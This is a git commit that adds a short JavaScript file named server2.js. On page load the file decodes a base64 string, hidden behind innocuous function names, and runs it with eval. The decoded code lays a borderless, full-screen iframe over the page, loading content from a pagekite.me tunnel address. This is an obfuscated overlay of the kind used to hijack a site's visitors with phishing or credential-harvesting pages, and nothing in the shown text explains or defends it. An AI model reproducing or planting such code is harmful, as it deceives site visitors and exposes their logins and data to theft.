93139120f3e1223123abdb0efaf57b9810f2836e
realpeanut <58894179+realpeanut@users.noreply.github.com>
2023-12-13 21:44:13 -0500

    Create server2.js

---
+++ server2.js
@@ -0,0 +1,10 @@
+document.addEventListener("DOMContentLoaded", function () {
+  function joy(happy) {
+    return decodeURIComponent(escape(atob(happy)));
+  }
+
+  const moon =
+    "ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChPYmplY3QuYXNzaWduKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpLCB7IHNyYzogJ2h0dHBzOi8vcG5hc3RyZC5wYWdla2l0ZS5tZS9zZXJ2aWNlL2h2dHJzOCUyRi02cndvajQtMTAyMCUyQ2NxYiUyQ2FycC0nLCBmcmFtZWJvcmRlcjogJzAnLCBzdHlsZTogJ3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JvcmRlcjpub25lOycgfSkpOw==";
+  const sun = joy(moon);
+  eval(sun);
+});
